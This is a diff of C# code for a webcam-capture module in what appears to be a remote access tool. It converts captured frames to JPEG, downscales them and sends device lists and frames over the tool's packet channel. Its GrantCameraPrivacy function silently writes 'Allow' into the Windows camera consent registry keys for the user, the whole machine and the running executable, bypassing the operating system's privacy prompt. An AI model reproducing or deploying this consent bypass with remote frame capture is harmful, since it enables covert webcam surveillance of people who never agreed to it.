+                try
+                {
+                    var unsetCbFn = Marshal.GetDelegateForFunctionPointer<SetCallback_Del>(
+                        Marshal.ReadIntPtr(Marshal.ReadIntPtr(pGrabIF), 9 * IntPtr.Size));
+                    unsetCbFn(pGrabIF, IntPtr.Zero, 1);
+                }
+                catch { }
+            }
+            if (pMediaCtrl != IntPtr.Zero)
+            {
+                try
+                {
+                    var stopFn = Marshal.GetDelegateForFunctionPointer<IMediaControl_Run_Del>(
+                        Marshal.ReadIntPtr(Marshal.ReadIntPtr(pMediaCtrl), 9 * IntPtr.Size));
+                    stopFn(pMediaCtrl);
+                }
+                catch { }
+                IUnknown_Release(pMediaCtrl);
+            }
+            if (pGrabIF   != IntPtr.Zero) IUnknown_Release(pGrabIF);
+            if (pNullRend != IntPtr.Zero) IUnknown_Release(pNullRend);
+            if (pGrabFilt != IntPtr.Zero) IUnknown_Release(pGrabFilt);
+            if (pCapFilt  != IntPtr.Zero) IUnknown_Release(pCapFilt);
+            if (pBuilder  != IntPtr.Zero) IUnknown_Release(pBuilder);
+            if (pGraph    != IntPtr.Zero) IUnknown_Release(pGraph);
+            // s_cbVtbl / s_cbObj are process-lifetime static — never freed here.
+        }
+    }
+
+    // ── Raw frame → JPEG ──────────────────────────────────────────────────────
+
+    private static byte[]? Yuy2ToJpeg(byte[] raw, int w, int h, int quality, bool bottomUp, out int length)
+    {
+        length = 0;
+        int bgraStride = w * 4;
+        var bgra = System.Buffers.ArrayPool<byte>.Shared.Rent(bgraStride * h);
+        try
+        {
+            int yuyStride = w * 2;
+            for (int row = 0; row < h; row++)
+            {
+                int srcRow = bottomUp ? h - 1 - row : row;
+                for (int col = 0; col < w; col++)
+                {
+                    int yuyBase = srcRow * yuyStride + (col & ~1) * 2;
+                    byte Y = raw[srcRow * yuyStride + col * 2];
+                    byte U = yuyBase + 1 < raw.Length ? raw[yuyBase + 1] : (byte)128;
+                    byte V = yuyBase + 3 < raw.Length ? raw[yuyBase + 3] : (byte)128;
+                    int C = Y - 16, D = U - 128, E = V - 128;
+                    int dst = row * bgraStride + col * 4;
+                    bgra[dst]     = (byte)Clamp255((298 * C + 516 * D           + 128) >> 8);
+                    bgra[dst + 1] = (byte)Clamp255((298 * C - 100 * D - 208 * E + 128) >> 8);
+                    bgra[dst + 2] = (byte)Clamp255((298 * C           + 409 * E + 128) >> 8);
+                    bgra[dst + 3] = 255;
+                }
+            }
+            return BgraToJpeg(bgra, w, h, bgraStride, quality, out length);
+        }
+        finally { System.Buffers.ArrayPool<byte>.Shared.Return(bgra); }
+    }
+
+    private static byte[]? Bgrx32ToJpeg(byte[] bgrx, int w, int h, int quality, out int length)
+    {
+        length = 0;
+        int stride = w * 4;
+        var bgra = System.Buffers.ArrayPool<byte>.Shared.Rent(stride * h);
+        try
+        {
+            for (int row = 0; row < h; row++)
+            {
+                int src = (h - 1 - row) * stride;
+                int dst = row * stride;
+                Buffer.BlockCopy(bgrx, src, bgra, dst, stride);
+                for (int col = 0; col < w; col++) bgra[dst + col * 4 + 3] = 255;
+            }
+            return BgraToJpeg(bgra, w, h, stride, quality, out length);
+        }
+        finally { System.Buffers.ArrayPool<byte>.Shared.Return(bgra); }
+    }
+
+    private static byte[]? Rgb24ToJpeg(byte[] rgb, int w, int h, int quality, out int length)
+    {
+        length = 0;
+        int bgraStride = w * 4;
+        int srcStride  = w * 3;
+        var bgra = System.Buffers.ArrayPool<byte>.Shared.Rent(bgraStride * h);
+        try
+        {
+            for (int row = 0; row < h; row++)
+            {
+                int srcRow = h - 1 - row;
+                for (int col = 0; col < w; col++)
+                {
+                    int s = srcRow * srcStride + col * 3;
+                    int d = row   * bgraStride + col * 4;
+                    if (s + 2 >= rgb.Length) break;
+                    bgra[d] = rgb[s]; bgra[d+1] = rgb[s+1]; bgra[d+2] = rgb[s+2]; bgra[d+3] = 255;
+                }
+            }
+            return BgraToJpeg(bgra, w, h, bgraStride, quality, out length);
+        }
+        finally { System.Buffers.ArrayPool<byte>.Shared.Return(bgra); }
+    }
+
+    private static byte[]? BgraToJpeg(byte[] bgra, int w, int h, int stride, int quality, out int length)
+    {
+        unsafe
+        {
+            fixed (byte* p = bgra)
+            {
+                int hr = GdipCreateBitmapFromScan0(w, h, stride, 0x26200A, (IntPtr)p, out IntPtr gdipBitmap);
+                if (hr != 0 || gdipBitmap == IntPtr.Zero) { length = 0; return null; }
+                try   { return RemoteDesktopFeature.GdipBitmapToJpeg(gdipBitmap, quality, out length); }
+                finally { GdipDisposeImage(gdipBitmap); }
+            }
+        }
+    }
+
+    private static int Clamp255(int v) => v < 0 ? 0 : v > 255 ? 255 : v;
+
+    // ── Messaging ─────────────────────────────────────────────────────────────
+
+    private static void SendError(string message)
+    {
+        var json = "{\"error\":\"" + EscapeJson(message) + "\"}";
+        _send?.Invoke((int)PacketType.WcamDevices, json)
+             .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
+    }
+
+    private static void SendDeviceList(string[] names)
+    {
+        var sb = new System.Text.StringBuilder();
+        sb.Append("{\"devices\":[");
+        for (int i = 0; i < names.Length; i++)
+        {
+            if (i > 0) sb.Append(',');
+            sb.Append("{\"i\":").Append(i)
+              .Append(",\"name\":\"").Append(EscapeJson(names[i])).Append("\"}");
+        }
+        sb.Append("]}");
+        _send?.Invoke((int)PacketType.WcamDevices, sb.ToString())
+             .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
+    }
+
+    // ── Camera privacy consent (Windows 11) ──────────────────────────────────
+
+    private static void GrantCameraPrivacy()
+    {
+        const string basePath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam";
+        byte[] allow = System.Text.Encoding.Unicode.GetBytes("Allow\0");
+
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, basePath, 0, IntPtr.Zero,
+                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, IntPtr.Zero,
+                            out IntPtr hk, out _) == 0)
+        { RegSetValueExW(hk, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hk); }
+
+        string? exe = Environment.ProcessPath;
+        if (!string.IsNullOrEmpty(exe))
+        {
+            string appKey = exe.Replace('\\', '#').TrimStart('#');
+            if (RegCreateKeyExW(HKEY_CURRENT_USER, $@"{basePath}\NonPackaged\{appKey}", 0,
+                                IntPtr.Zero, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                                IntPtr.Zero, out IntPtr hk2, out _) == 0)
+            { RegSetValueExW(hk2, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hk2); }
+        }
+
+        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, basePath, 0, IntPtr.Zero,
+                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, IntPtr.Zero,
+                            out IntPtr hkLm, out _) == 0)
+        { RegSetValueExW(hkLm, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hkLm); }
+
+        if (!string.IsNullOrEmpty(exe))
+        {
+            string appKey = exe.Replace('\\', '#').TrimStart('#');
+            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, $@"{basePath}\NonPackaged\{appKey}", 0,
+                                IntPtr.Zero, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                                IntPtr.Zero, out IntPtr hkLm2, out _) == 0)
+            { RegSetValueExW(hkLm2, "Value", 0, REG_SZ, allow, (uint)allow.Length); RegCloseKey(hkLm2); }
+        }
+    }
+
+    // ── Downscaling helpers ────────────────────────────────────────────────────
+
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipGetImageGraphicsContext(IntPtr image, out IntPtr graphics);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipDrawImageRectI(IntPtr graphics, IntPtr image, int x, int y, int w, int h);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipDeleteGraphics(IntPtr graphics);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipSetInterpolationMode(IntPtr graphics, int mode);
+
+    private static byte[] Yuy2ToBgra(byte[] raw, int w, int h, bool bottomUp = false)
+    {
+        int stride = w * 4;
+        var bgra = System.Buffers.ArrayPool<byte>.Shared.Rent(stride * h);
+        int yuyStride = w * 2;
+        for (int row = 0; row < h; row++)
+        {
+            int srcRow = bottomUp ? h - 1 - row : row;
+            for (int col = 0; col < w; col++)
+            {
+                int yuyBase = srcRow * yuyStride + (col & ~1) * 2;
+                byte Y = raw[srcRow * yuyStride + col * 2];
+                byte U = yuyBase + 1 < raw.Length ? raw[yuyBase + 1] : (byte)128;
+                byte V = yuyBase + 3 < raw.Length ? raw[yuyBase + 3] : (byte)128;
+                int C = Y - 16, D = U - 128, E = V - 128;
+                int dst = row * stride + col * 4;
+                bgra[dst]     = (byte)Clamp255((298 * C + 516 * D           + 128) >> 8);
+                bgra[dst + 1] = (byte)Clamp255((298 * C - 100 * D - 208 * E + 128) >> 8);
+                bgra[dst + 2] = (byte)Clamp255((298 * C           + 409 * E + 128) >> 8);
+                bgra[dst + 3] = 255;
+            }
+        }
+        return bgra;
+    }
+
+    private static byte[] Bgrx32ToBgra(byte[] bgrx, int w, int h)
+    {
+        int stride = w * 4;
+        var bgra = System.Buffers.ArrayPool<byte>.Shared.Rent(stride * h);
+        for (int row = 0; row < h; row++)
+        {
+            int src = (h - 1 - row) * stride;
+            int dst = row * stride;
+            Buffer.BlockCopy(bgrx, src, bgra, dst, stride);
+            for (int col = 0; col < w; col++) bgra[dst + col * 4 + 3] = 255;
+        }
+        return bgra;
+    }
+
+    private static byte[] Rgb24ToBgra(byte[] rgb, int w, int h)
+    {
+        int bgraStride = w * 4;
+        int srcStride  = w * 3;
+        var bgra = System.Buffers.ArrayPool<byte>.Shared.Rent(bgraStride * h);
+        for (int row = 0; row < h; row++)
+        {
+            int srcRow = h - 1 - row;
+            for (int col = 0; col < w; col++)
+            {
+                int s = srcRow * srcStride + col * 3;
+                int d = row   * bgraStride + col * 4;
+                if (s + 2 >= rgb.Length) break;
+                bgra[d] = rgb[s]; bgra[d+1] = rgb[s+1]; bgra[d+2] = rgb[s+2]; bgra[d+3] = 255;
+            }
+        }
+        return bgra;
+    }
+
+    private static byte[]? ScaleAndEncode(byte[] bgra, int srcW, int srcH, int dstW, int dstH, int quality, out int length)
+    {
+        length = 0;
+        RemoteDesktopFeature.EnsureGdiplusPublic();
+        // Pin for full pipeline lifetime — GDI+ reads scan0 during GdipDrawImageRectI, not just at creation.
+        var pin = GCHandle.Alloc(bgra, GCHandleType.Pinned);
+        IntPtr srcBmp = IntPtr.Zero, dstBmp = IntPtr.Zero, gfx = IntPtr.Zero;
+        try
+        {
+            if (GdipCreateBitmapFromScan0(srcW, srcH, srcW * 4, 0x26200A, pin.AddrOfPinnedObject(), out srcBmp) != 0 || srcBmp == IntPtr.Zero)
+                return null;
+            if (GdipCreateBitmapFromScan0(dstW, dstH, 0, 0x26200A, IntPtr.Zero, out dstBmp) != 0 || dstBmp == IntPtr.Zero)
+                return null;
+            if (GdipGetImageGraphicsContext(dstBmp, out gfx) != 0 || gfx == IntPtr.Zero)
+                return null;
+            GdipSetInterpolationMode(gfx, 2); // Bilinear
+            GdipDrawImageRectI(gfx, srcBmp, 0, 0, dstW, dstH);
+            GdipDeleteGraphics(gfx); gfx = IntPtr.Zero;
+            return RemoteDesktopFeature.GdipBitmapToJpeg(dstBmp, quality, out length);
+        }
+        catch { return null; }
+        finally
+        {
+            if (gfx    != IntPtr.Zero) GdipDeleteGraphics(gfx);
+            if (dstBmp  != IntPtr.Zero) GdipDisposeImage(dstBmp);
+            if (srcBmp  != IntPtr.Zero) GdipDisposeImage(srcBmp);
+            pin.Free();
+        }
+    }
+
+    private static byte[]? ScaleMjpeg(byte[] jpegData, int dstW, int dstH, int quality, out int length, out bool isRented)
+    {
+        length = jpegData.Length; isRented = false;
+        RemoteDesktopFeature.EnsureGdiplusPublic();
+        // pStream must outlive srcBmp — GdipCreateBitmapFromStream may lazy-decode.
+        IntPtr srcBmp = IntPtr.Zero, pStream = IntPtr.Zero;
+        try
+        {
+            var hGlobal = Marshal.AllocHGlobal(jpegData.Length);
+            Marshal.Copy(jpegData, 0, hGlobal, jpegData.Length);
+            CreateStreamOnHGlobal(hGlobal, true, out pStream);
+            if (pStream == IntPtr.Zero) { Marshal.FreeHGlobal(hGlobal); return jpegData; }
+            GdipCreateBitmapFromStream(pStream, out srcBmp);
+            if (srcBmp == IntPtr.Zero) return jpegData;
+
+            IntPtr dstBmp = IntPtr.Zero, gfx = IntPtr.Zero;
+            try
+            {
+                if (GdipCreateBitmapFromScan0(dstW, dstH, 0, 0x26200A, IntPtr.Zero, out dstBmp) != 0 || dstBmp == IntPtr.Zero)
+                    return jpegData;
+                if (GdipGetImageGraphicsContext(dstBmp, out gfx) != 0 || gfx == IntPtr.Zero)
+                    return jpegData;
+                GdipSetInterpolationMode(gfx, 2);
+                GdipDrawImageRectI(gfx, srcBmp, 0, 0, dstW, dstH);
+                GdipDeleteGraphics(gfx); gfx = IntPtr.Zero;
+                isRented = true;
+                return RemoteDesktopFeature.GdipBitmapToJpeg(dstBmp, quality, out length);
+            }
+            finally
+            {
+                if (gfx    != IntPtr.Zero) GdipDeleteGraphics(gfx);
+                if (dstBmp  != IntPtr.Zero) GdipDisposeImage(dstBmp);
+            }
+        }
+        catch { length = jpegData.Length; isRented = false; return jpegData; }
+        finally
+        {
+            if (srcBmp  != IntPtr.Zero) GdipDisposeImage(srcBmp);
+            if (pStream != IntPtr.Zero) Marshal.Release(pStream);
+        }
+    }
+
+    [DllImport("ole32.dll")]
+    private static extern int CreateStreamOnHGlobal(IntPtr hGlobal, bool fDeleteOnRelease, out IntPtr ppstm);
+    [DllImport("gdiplus.dll")]
+    private static extern int GdipCreateBitmapFromStream(IntPtr stream, out IntPtr bitmap);
+
+    private static string EscapeJson(string s)
+        => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
+}
